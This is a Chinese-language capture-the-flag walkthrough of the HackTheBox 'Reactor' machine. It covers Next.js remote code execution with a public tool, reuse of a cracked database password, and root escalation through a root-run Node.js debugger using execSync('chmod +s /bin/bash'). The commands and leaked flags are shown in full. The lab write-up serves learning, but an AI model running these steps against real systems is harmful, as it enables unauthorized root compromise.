---
title: htb-reactor
published: 2026-05-28T00:00:00.000Z
category: 技术
draft: false
---

![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779884691238-008c64eb-985c-4165-bf24-6f0c23f6b98b.png)

kali没开，就用tscan随便扫了一下，扫出了一个3000端口



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779886022906-19f8d254-257e-447f-b254-20bfe2364287.png)



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779886034237-692dc39f-eaa6-4e1c-a687-c82e1cff7286.png)

和去年爆出的那个cve有点像，使用工具直接rce，[https://github.com/Rsatan/Next.js-Exploit-Tool](https://github.com/Rsatan/Next.js-Exploit-Tool)



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779885972730-c6a3c7f8-b673-48fd-b2f6-e42e0849d80c.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779949772672-91041433-b4fc-4114-b07d-05be792c9a00.png)

把shell弹到vshell，方便下载下面的文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779949815397-daff649c-7f0d-4af5-8889-61fa63c430cb.png)

查看数据库，在opt文件下



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779950044774-101fd442-d03d-40b0-a794-b4535754cfd8.png)

放到md5解密，admin的密码没解密出来，下面那个解出来了，<font style="color:rgb(0, 0, 0);">reactor1</font>  

![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779950127736-dfc86587-be61-4e05-91e8-5e0280948f8e.png)

<font style="color:rgb(77, 77, 77);">获取engineer用户</font>

```plain
engineer:reactor1
```

通过ssh连上这个服务器



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779950727994-ab8c8fec-8ca2-4113-b335-e8a8db3bd9a7.png)

sudo -l发现该用户没有sudo权限


![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779950839061-ccc1cce7-2197-49f5-b2ec-42785055acec.png)

查看后台进程在跑啥，发现9929跑了root的调试器

```shell
 ps aux | grep node  
```



![](https://cdn.nlark.com/yuque/0/2026/png/46558797/1779951113496-855d4a7d-e887-4951-84c7-304cbe5e6148.png)

 尝试用 Node 自带的客户端去连接这个本地端口  ，接着 修改 /bin/bash 的权限  ， 给系统的 `bash` 解释器加上 **SUID** 权限  

```shell
exec require('child_process').execSync('chmod +s /bin/bash')
```

没提权成功，换种方式

```shell
debug> exec process.mainModule.require('child_process').execSync('chmod +s /bin/bash')
Uint8Array(0)
```

```shell
engineer@reactor:~$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
engineer@reactor:~$ /bin/bash -p
bash-5.2# find flag
find: ‘flag’: No such file or directory
bash-5.2# cd /root
ls -la
total 44
drwx------  7 root root 4096 May 28 06:23 .
drwxr-xr-x 23 root root 4096 May 20 10:07 ..
-rw-------  1 root root    0 May 20 10:12 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 May 20 09:10 .cache
drwxr-xr-x  3 root root 4096 Dec 28 20:47 .config
-rw-------  1 root root   20 May 18 13:10 .lesshst
drwxr-xr-x  3 root root 4096 Dec 28 20:54 .local
drwxr-xr-x  4 root root 4096 Dec 28 20:37 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 May 28 06:23 root.txt
drwx------  2 root root 4096 Dec 28 20:30 .ssh
bash-5.2# cat root.txt
4cab7aafee73421669f29b339febbbbe
bash-5.2# cat /home/engineer/user.txt
7d9c39299219779990597105501c5a26
```



### 总结

Node.js 调试器提权失败原因分析

1. 为什么直接用 require(...) 报错？  
   在 debug> 中执行 require('child_process') 报错 ReferenceError: require is not defined，原因有二：

使用了 ESM 模式：目标 Node.js 项目采用了现代的 ECMAScript 模块标准（即 import 语法），在这种环境下，传统的 require 全局变量根本不存在。

作用域隔离：调试器当前停留在某个局部作用域内，无法直接访问全局的模块加载器。

2. 为什么 process.mainModule.require(...) 能成功？  
   process 是绝对全局的：无论 Node.js 采用哪种模块标准，process（进程对象）在任何底层上下文都必定存在。

绕过作用域：process.mainModule 直接指向了程序的主入口对象。通过它去调用 .require()，相当于绕过了当前的局部限制，强行从顶层环境加载了 child_process 模块，从而成功以 root 权限执行了系统命令。

单句总结：直接找 require 提示找不到，而通过 process 进程对象能强行把它从后台抠出来。

